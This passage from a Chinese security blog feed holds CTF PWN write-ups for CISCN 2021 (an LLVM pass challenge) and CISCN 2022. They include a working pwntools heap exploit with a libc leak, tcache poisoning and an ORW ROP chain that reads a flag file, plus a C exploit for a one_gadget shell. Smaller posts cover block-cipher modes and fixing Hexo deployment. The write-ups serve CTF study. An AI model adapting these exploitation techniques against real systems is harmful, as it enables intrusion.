id="GDB-调试LLVM-PASS"><a href="#GDB-调试LLVM-PASS" class="headerlink" title="GDB 调试LLVM PASS"></a>GDB 调试LLVM PASS</h3><p>首先我们编写部分exp，类似我们动态做普通的PWN题目。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ clang -S -emit-llvm exp.c -o exp.ll -v<br><span class="hljs-comment">#这里加上 -v 可以显示出详细参数</span><br></code></pre></td></tr></table></figure><p>我们主要途中圈的这一部分</p><p><img src="/img/article/llvmCreate/image-20220630221103947.png" alt="image-20220630221103947"></p><blockquote><p>-triple x86_64-pc-linux-gnu -emit-llvm -disable-free -disable-llvm-verifier -discard-value-names -main-file-name exp.c -mrelocation-model static -mthread-model posix -mframe-pointer&#x3D;all -fmath-errno -fno-rounding-math -masm-verbose -mconstructor-aliases -munwind-tables -target-cpu x86-64 -dwarf-column-info -fno-split-dwarf-inlining -debugger-tuning&#x3D;gdb -v -resource-dir &#x2F;usr&#x2F;lib&#x2F;llvm-10&#x2F;lib&#x2F;clang&#x2F;10.0.0 -internal-isystem &#x2F;usr&#x2F;local&#x2F;include -internal-isystem &#x2F;usr&#x2F;lib&#x2F;llvm-10&#x2F;lib&#x2F;clang&#x2F;10.0.0&#x2F;include -internal-externc-isystem &#x2F;usr&#x2F;include&#x2F;x86_64-linux-gnu -internal-externc-isystem &#x2F;include -internal-externc-isystem &#x2F;usr&#x2F;include -fdebug-compilation-dir &#x2F;home&#x2F;loorain&#x2F;ciscn&#x2F;CISCN_2021_pwn&#x2F;SATool_附件 -ferror-limit 19 -fmessage-length 0 -fgnuc-version&#x3D;4.2.1 -fobjc-runtime&#x3D;gcc -fdiagnostics-show-option -fcolor-diagnostics -faddrsig -o exp.ll -x c exp.c</p></blockquote><p>在另一终端中使用如下指令,即可开始调试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ gdb clang<br>GNU gdb (Ubuntu 9.2-0ubuntu1~20.04.1) 9.2<br>......<br>......<br>pwndbg&gt; <span class="hljs-built_in">set</span> args -triple x86_64-pc-linux-gnu -emit-llvm -disable-free -disable-llvm-verifier -discard-value-names -main-file-name exp.c -mrelocation-model static -mthread-model posix -mframe-pointer=all -fmath-errno -fno-rounding-math -masm-verbose -mconstructor-aliases -munwind-tables -target-cpu x86-64 -dwarf-column-info -fno-split-dwarf-inlining -debugger-tuning=gdb -v -resource-dir /usr/lib/llvm-10/lib/clang/10.0.0 -internal-isystem /usr/local/include -internal-isystem /usr/lib/llvm-10/lib/clang/10.0.0/include -internal-externc-isystem /usr/include/x86_64-linux-gnu -internal-externc-isystem /include -internal-externc-isystem /usr/include -fdebug-compilation-dir /home/loorain/ciscn/CISCN_2021_pwn/SATool_附件 -ferror-limit 19 -fmessage-length 0 -fgnuc-version=4.2.1 -fobjc-runtime=gcc -fdiagnostics-show-option -fcolor-diagnostics -faddrsig -o exp.ll -x c exp.c<br>pwndbg&gt; b main<br>Breakpoint 1 at 0x40da90<br>pwndbg&gt; n<br>The program is not being run.<br>pwndbg&gt; r<br></code></pre></td></tr></table></figure><h3 id="解题思路-amp-EXP"><a href="#解题思路-amp-EXP" class="headerlink" title="解题思路&amp;EXP"></a>解题思路&amp;EXP</h3><ul><li><p>先申请多个chunk讲tache腾空，以申请unsortbin中的chunk</p></li><li><p>在申请unsortbin时，第一个参数放置’\x00‘以此保留libc信息</p></li><li><p>利用stealkey和fakekey将chunk中的fd更改为onegadget</p></li><li><p>然后利用run直接getshell</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">run</span><span class="hljs-params">()</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">save</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1,<span class="hljs-type">char</span> *a2)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">fakekey</span><span class="hljs-params">(int64)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">takeaway</span><span class="hljs-params">(<span class="hljs-type">char</span> *a1)</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">stealkey</span><span class="hljs-params">()</span>&#123;<span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;&#125;;<br><span class="hljs-type">int</span> <span class="hljs-title function_">B4ckDo0r</span><span class="hljs-params">()</span><br>&#123;<br>        save(<span class="hljs-string">&quot;aaaa&quot;</span>,<span class="hljs-string">&quot;aaaa&quot;</span>);<br>        save(<span class="hljs-string">&quot;aaddd&quot;</span>,<span class="hljs-string">&quot;aadd&quot;</span>);<br>        save(<span class="hljs-string">&quot;ssss&quot;</span>,<span class="hljs-string">&quot;sss&quot;</span>);<br>        save(<span class="hljs-string">&quot;ssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>        save(<span class="hljs-string">&quot;sssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>        save(<span class="hljs-string">&quot;sssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>    save(<span class="hljs-string">&quot;sssss&quot;</span>,<span class="hljs-string">&quot;sssss&quot;</span>);<br>        save(<span class="hljs-string">&quot;\x00&quot;</span>,<span class="hljs-string">&quot;ssssss&quot;</span>);<br>        stealkey();<br>        fakekey(<span class="hljs-number">-0x2E19b4</span>);<br>        run();<br> <br>&#125;<br></code></pre></td></tr></table></figure></li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>【CISCN2022】 东北赛区分区赛PWN WriteUP</title>
    <link href="/2022/06/21/CISCN%202022/"/>
    <url>/2022/06/21/CISCN%202022/</url>
    
    <content type="html"><![CDATA[<h2 id="soil3-amp-mountain1"><a href="#soil3-amp-mountain1" class="headerlink" title="soil3 &amp; mountain1"></a>soil3 &amp; mountain1</h2><ul><li>首先根据unsorted bin 泄露出libc</li><li>然后根据libc_base 和 <code>libc.bss()</code>函数泄露栈地址</li><li>利用orw ROP覆盖ret返回地址，并绕过沙盒机制</li><li>soil3 题目，唯一的区别就是没有沙盒，原mountain题目的EXP即可通过</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br></pre></td><td class="code"><pre><code class="hljs PYTHON"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>io = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><span class="hljs-comment"># io = remote(&#x27;172.16.30.186&#x27;,58012)</span><br><span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span><br>libc = ELF(<span class="hljs-string">&#x27;./libc.so.6&#x27;</span>)<br>elf = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">add</span>(<span class="hljs-params">size,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;1&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input size:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(size))<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input content:&#x27;</span>)<br>    io.send(content)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">free</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;2&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">show</span>(<span class="hljs-params">idx</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;3&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">edit</span>(<span class="hljs-params">idx,content</span>):<br>    io.recvuntil(<span class="hljs-string">&#x27;Choice:&#x27;</span>)<br>    io.sendline(<span class="hljs-string">&#x27;4&#x27;</span>)<br>    io.recvuntil(<span class="hljs-string">&#x27;Please input idx:&#x27;</span>)<br>    io.sendline(<span class="hljs-built_in">str</span>(idx))<br>    <span class="hljs-keyword">if</span> idx&lt;=<span class="hljs-number">32</span>:<br>        io.recvuntil(<span class="hljs-string">&#x27;Please input content:&#x27;</span>)<br>        io.send(content)<br><br><br>add(<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x430</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br><br><span class="hljs-comment"># pause()</span><br>show(<span class="hljs-number">0</span>)<br><span class="hljs-comment"># io.recvline()</span><br><span class="hljs-comment"># pause()</span><br>libc_base = u64(io.recvuntil(<span class="hljs-string">&#x27;Done&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>)) - libc.symbols[<span class="hljs-string">&#x27;main_arena&#x27;</span>] - <span class="hljs-number">96</span><br>success(<span class="hljs-string">&#x27;libc_base --&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(libc_base))<br>bss_addr = libc_base + libc.bss()<br>success(<span class="hljs-string">&#x27;bss --&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(bss_addr))<br>flag_addr = bss_addr + <span class="hljs-number">0x200</span><br><span class="hljs-comment"># edit(32,&#x27;&#x27;)</span><br><br>pop_rdi = libc_base +<span class="hljs-number">0x000000000002daa2</span> <span class="hljs-comment">#: pop rdi ; ret</span><br>pop_rsi = libc_base + <span class="hljs-number">0x0000000000037bfa</span><span class="hljs-comment"># : pop rsi ; ret</span><br>pop_rdx = libc_base + <span class="hljs-number">0x0000000000106791</span><span class="hljs-comment"># : pop rdx ; pop r12 ; ret</span><br>pop_rax = libc_base + <span class="hljs-number">0x00000000000446b0</span><span class="hljs-comment"># : pop rax ; ret</span><br>open_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;open&#x27;</span>]<br>read_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;read&#x27;</span>]<br>write_addr = libc_base + libc.symbols[<span class="hljs-string">&#x27;write&#x27;</span>]<br><br><br><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;bbbb&#x27;</span>)<br>free(<span class="hljs-number">0</span>)<br>show(<span class="hljs-number">0</span>)<br>key = u64(io.recvuntil(<span class="hljs-string">&#x27;Done&#x27;</span>)[<span class="hljs-number">1</span>:-<span class="hljs-number">4</span>].ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>success(<span class="hljs-string">&#x27;key--&gt;&#x27;</span> + <span class="hljs-built_in">hex</span>(key))<br><span class="hljs-comment"># pause()</span><br><br>edit(<span class="hljs-number">0</span>,<span class="hljs-string">&#x27;c&#x27;</span>*<span class="hljs-number">0x40</span>)<br><span class="hljs-comment"># pause()</span><br>free(<span class="hljs-number">0</span>)<br><br>edit(<span class="hljs-number">0</span>,p64((bss_addr-<span class="hljs-number">0x10</span>)^key))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x400</span>,p64((bss_addr-<span class="hljs-number">0x10</span>)^key))<br><span class="hljs-comment"># pause()</span><br><br>add(<span class="hljs-number">0x400</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br><br><span class="hljs-comment"># pause()</span><br>show(<span class="hljs-number">4</span>)<br>io.recvuntil(<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x10</span>)<br>stack = u64(io.recv(<span class="hljs-number">6</span>).ljust(<span class="hljs-number">8</span>,<span class="hljs-string">b&#x27;\x00&#x27;</span>))<br>ret = stack-<span class="hljs-number">0x148</span><br>success(<span class="hljs-string">&#x27;stack_addr --&gt;&#x27;</span> +<span class="hljs-built_in">hex</span>(stack-<span class="hljs-number">0x8</span>))<br>success(<span class="hljs-string">&#x27;ret--&gt;&#x27;</span>+<span class="hljs-built_in">hex</span>(ret))<br><span class="hljs-comment"># free(1)</span><br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>add(<span class="hljs-number">0x30</span>,<span class="hljs-string">&#x27;aaaa&#x27;</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,<span class="hljs-string">&#x27;a&#x27;</span>*<span class="hljs-number">0x40</span>)<br>free(<span class="hljs-number">5</span>)<br>edit(<span class="hljs-number">5</span>,p64((ret)^key))<br><span class="hljs-comment"># pause()</span><br>add(<span class="hljs-number">0x400</span>,p64((ret)^key))<br>pause()<br>orw = <span class="hljs-string">b&#x27;./flag\x00\x00&#x27;</span><br>orw += p64(pop_rdi)<br>orw += p64(ret)<br>orw += p64(pop_rsi)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(open_addr)<br><br><br><span class="hljs-comment">##read</span><br>orw += p64(pop_rdi)<br>orw += p64(<span class="hljs-number">3</span>)<br>orw += p64(pop_rsi)<br>orw += p64(flag_addr)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(read_addr)<br><br><span class="hljs-comment">##write</span><br>orw += p64(pop_rdi)<br>orw += p64(<span class="hljs-number">1</span>)<br>orw += p64(pop_rsi)<br>orw += p64(flag_addr)<br>orw += p64(pop_rdx)<br>orw += p64(<span class="hljs-number">0x100</span>)<br>orw += p64(<span class="hljs-number">0</span>)<br>orw += p64(write_addr)<br>add(<span class="hljs-number">0x400</span>,orw)<br><br>io.interactive()<br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>分组密码的五种工作模式</title>
    <link href="/2022/06/08/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%94%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/"/>
    <url>/2022/06/08/%E5%88%86%E7%BB%84%E5%AF%86%E7%A0%81%E7%9A%84%E4%BA%94%E7%A7%8D%E5%B7%A5%E4%BD%9C%E6%A8%A1%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<h2 id="电子密码本模式Electronic-Codebook-ECB"><a href="#电子密码本模式Electronic-Codebook-ECB" class="headerlink" title="电子密码本模式Electronic Codebook, ECB"></a>电子密码本模式Electronic Codebook, ECB</h2><blockquote><p>明文分成64的分组进行加密，必要时填充，每个分组用同一密钥加密，同样明文分组加密得相同密文</p></blockquote><h3 id="示意图"><a href="#示意图" class="headerlink" title="示意图"></a>示意图</h3><p><img src="/img/article/cry-mode/cry1.png" alt="ECB"></p><h3 id="局限性"><a href="#局限性" class="headerlink" title="局限性"></a>局限性</h3><ul><li>ECB模式特别适合数据较少的情况，如安全传输DES密钥</li><li>一段明文消息中若有几个相同的明文组，则密文也将出现几个相同的片段</li><li>对于很长的消息，ECB是不安全的，如果消息是非常结构化的，密码分析可能利用其结构特征来破解</li><li>ECB的弱点来源于其加密过的密文分组是互相独立的</li></ul><h2 id="密文分组链接模式Cipher-Block-Chaining-CBC"><a href="#密文分组链接模式Cipher-Block-Chaining-CBC" class="headerlink" title="密文分组链接模式Cipher Block Chaining (CBC)"></a>密文分组链接模式Cipher Block Chaining (CBC)</h2><blockquote><p>加密输入是当前明文分组和前一密文分组的异或，形成一条链，使用相同的密钥， 这样每个明文分组的加密函数输入与明文分组之间不再有固定的关系</p></blockquote><h3 id="示意图-1"><a href="#示意图-1" class="headerlink" title="示意图"></a>示意图</h3><p><img src="/img/article/cry-mode/cry2.png" alt="CBC"></p><h3 id="优点和局限"><a href="#优点和局限" class="headerlink" title="优点和局限"></a>优点和局限</h3><ul><li>每个密文分组依赖于其他明文分组 </li><li>明文消息中的任何一点变化都会影响密文分组 </li><li>发送方和接收方需要共享初始向量Initial Value(IV)<ul><li>如果IV被明文传送，则攻击者可以改变第一个分组的某些位，然后预先改变IV中的某些位，则接收者收到的P1也就相应改变了</li><li>因此，IV必须是一个固定的值或者必须用ECB方式在消息之前加密传送</li></ul></li><li>在消息的最后，还要处理不够长度的分组 <ul><li>可以填充已知非数据值，或者在最后一块补上填充位长度</li></ul></li></ul><h2 id="密码反馈模式Cipher-FeedBack-CFB"><a href="#密码反馈模式Cipher-FeedBack-CFB" class="headerlink" title="密码反馈模式Cipher FeedBack (CFB)"></a>密码反馈模式Cipher FeedBack (CFB)</h2><blockquote><ul><li>是一种将DES转化成流密码的技术，不再要求报文被填充成整个分组，可以实时运行，如果要传输一个字符流，每个字符都可以使用面向字符的流密码加密后立即传输。</li><li>加密：加密函数的输入是一个64位的移位寄存器，产生初始向量IV。加密函数高端j位与明文P1的第一单元异或，产生j位密文C1进入移位寄存器低端，继续加密，与P2输入异或，如此重复直到所有明文单元都完成加密。</li><li>解密：采用相同方案，但是使用加密函数而非解密函数</li></ul></blockquote><h3 id="示意图-2"><a href="#示意图-2" class="headerlink" title="示意图"></a>示意图</h3><p><img src="/img/article/cry-mode/cry3.png" alt="CFB"></p><h3 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h3><ul><li>当数据以位或字节形式到达时使用都是适当的 </li><li>最通用的是流密码形式</li></ul><h2 id="输出反馈模式Output-FeedBack-OFB"><a href="#输出反馈模式Output-FeedBack-OFB" class="headerlink" title="输出反馈模式Output FeedBack (OFB)"></a>输出反馈模式Output FeedBack (OFB)</h2><blockquote><p>结构上类似CFB，但是OFB中加密函数输出被反馈回移位寄存器，CFB中是密文单元被反馈回移位寄存器。优点是传输中的比特差错不会传播，缺点是比CFB更容易受报文流篡改攻击。</p></blockquote><h3 id="示意图-3"><a href="#示意图-3" class="headerlink" title="示意图"></a>示意图</h3><p><img src="/img/article/cry-mode/cry4.png" alt="OFB"></p><h3 id="优缺点-1"><a href="#优缺点-1" class="headerlink" title="优缺点"></a>优缺点</h3><ul><li>OFB的一个优点是传输过程中在某位上发生的错误不会影响到其他位。比如，C1中有1位发生了错误，只会影响到P1的恢复，后续的明文单元不受影响。</li><li>OFB的缺点是，抗消息流篡改攻击的能力不如CFB。即密文中的某位取反，恢复出的明文相应位也取反</li></ul><h2 id="计数器模式Counter-CTR"><a href="#计数器模式Counter-CTR" class="headerlink" title="计数器模式Counter (CTR)"></a>计数器模式Counter (CTR)</h2><blockquote><ul><li>是一种新模式，虽然早就提出来了</li><li>与OFB很像，但是加密的是计数器的值而不是任何反馈回来的值</li><li>每一个明文分组都必须使用一个不同的密钥和计数器值，决不要重复使用Ci &#x3D; Pi XOR Oi Oi &#x3D; DESK1(i)</li><li>可以用于高速网络加密中</li></ul></blockquote><h3 id="示意图-4"><a href="#示意图-4" class="headerlink" title="示意图"></a>示意图</h3><p><img src="/img/article/cry-mode/cry5.png" alt="CTR"></p><h3 id="优缺点-2"><a href="#优缺点-2" class="headerlink" title="优缺点"></a>优缺点</h3><ul><li>高效<ul><li>可以做并行加密</li><li>对高速链路的突发数据加密尤其有效</li></ul></li><li>可以对被加密的分组进行随机存取</li><li>相当安全</li><li>简洁</li><li>必须决不重复使用密钥和计数器值</li></ul>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Hexo部署出现错误 Error Spawn failed 解决方式(code 128)</title>
    <link href="/2022/06/07/Hexo%E9%83%A8%E7%BD%B2%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%20Error%20Spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/"/>
    <url>/2022/06/07/Hexo%E9%83%A8%E7%BD%B2%E5%87%BA%E7%8E%B0%E9%94%99%E8%AF%AF%20Error%20Spawn%20failed%20%E8%A7%A3%E5%86%B3%E6%96%B9%E5%BC%8F/</url>
    
    <content type="html"><![CDATA[<blockquote><p>记录一次报错处理方式，在更新了自己的必读书目之后，执行 hexo clean &amp;&amp; hexo g -d 时出现如下错误</p></blockquote><h2 id="错误信息一"><a href="#错误信息一" class="headerlink" title="错误信息一"></a>错误信息一</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs bash">Missing or invalid credentials.<br>Error: connect ECONNREFUSED /run/user/1000/vscode-git-2098f677fa.sock<br>    at PipeConnectWrap.afterConnect [as oncomplete] (node:net:1161:16) &#123;<br>  errno: -111,<br>  code: <span class="hljs-string">&#x27;ECONNREFUSED&#x27;</span>,<br>  syscall: <span class="hljs-string">&#x27;connect&#x27;</span>,<br>  address: <span class="hljs-string">&#x27;/run/user/1000/vscode-git-2098f677fa.sock&#x27;</span><br>&#125;<br>Missing or invalid credentials.<br>Error: connect ECONNREFUSED /run/user/1000/vscode-git-2098f677fa.sock<br>    at PipeConnectWrap.afterConnect [as oncomplete] (node:net:1161:16) &#123;<br>  errno: -111,<br>  code: <span class="hljs-string">&#x27;ECONNREFUSED&#x27;</span>,<br>  syscall: <span class="hljs-string">&#x27;connect&#x27;</span>,<br>  address: <span class="hljs-string">&#x27;/run/user/1000/vscode-git-2098f677fa.sock&#x27;</span><br>&#125;<br>remote: No anonymous write access.<br>fatal: Authentication failed <span class="hljs-keyword">for</span> <span class="hljs-string">&#x27;https://github.com/Loora1N/Loora1N.github.io/&#x27;</span><br>FATAL &#123;<br>  err: Error: Spawn failed<br>      at ChildProcess.&lt;anonymous&gt; (/home/loorain/myBlog/node_modules/hexo-util/lib/spawn.js:51:21)<br>      at ChildProcess.emit (node:events:527:28)<br>      at ChildProcess._handle.onexit (node:internal/child_process:291:12) &#123;<br>    code: 128<br>  &#125;<br>&#125; Something<span class="hljs-string">&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br></code></pre></td></tr></table></figure><h3 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h3><p>一、打开vscode设置界面，搜索git.terminal Authentication，将他前面的 √ 去掉</p><p><img src="/img/article/error128/vscode1.png" alt="image-20220607164521802"></p><p>二、crtl + shift + p 打开搜索框，搜索reload window并运行</p><p><img src="/img/article/error128/vscode2.png" alt="image-20220607164739265"></p><p>三、再次尝试hexo g，解决成功</p><p><img src="/img/article/error128/vscode3.png" alt="image-20220607164850847"></p><h2 id="错误信息二"><a href="#错误信息二" class="headerlink" title="错误信息二"></a>错误信息二</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">fatal: unable to access <span class="hljs-string">&#x27;https://github.com/Loora1N/Loora1N.github.io/&#x27;</span>: gnutls_handshake() failed: Error <span class="hljs-keyword">in</span> the pull <span class="hljs-keyword">function</span>.<br>FATAL &#123;<br>  err: Error: Spawn failed<br>      at ChildProcess.&lt;anonymous&gt; (/home/loorain/myBlog/node_modules/hexo-util/lib/spawn.js:51:21)<br>      at ChildProcess.emit (node:events:527:28)<br>      at ChildProcess._handle.onexit (node:internal/child_process:291:12) &#123;<br>    code: 128<br>  &#125;<br>&#125; Something<span class="hljs-string">&#x27;s wrong. Maybe you can find the solution here: %s https://hexo.io/docs/troubleshooting.html</span><br></code></pre></td></tr></table></figure><h3 id="解决方法-1"><a href="#解决方法-1" class="headerlink" title="解决方法"></a>解决方法</h3><p>打开_config.yml文件，更改https仓库地址为ssh地址,配置ssh密钥即可</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-comment"># Deployment</span><br><span class="hljs-comment">## Docs: https://hexo.io/docs/one-command-deployment</span><br><span class="hljs-attr">deploy:</span><br>  <span class="hljs-attr">type:</span> <span class="hljs-string">git</span><br>  <span class="hljs-attr">repo:</span><span class="hljs-string">https://github.com/YourName/YourName.github.io.git(不要使用这个)</span><br>  <span class="hljs-string">git@github.com:YourName/YourName.github.io.git(用这个)</span><br>  <span class="hljs-attr">branch:</span> <span class="hljs-string">master</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>Python实现shamir加密和图像加密隐写</title>
    <link href="/2022/06/05/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%8A%E6%9C%BA/"/>
    <url>/2022/06/05/%E7%BD%91%E7%BB%9C%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E4%B8%8A%E6%9C%BA/</url>
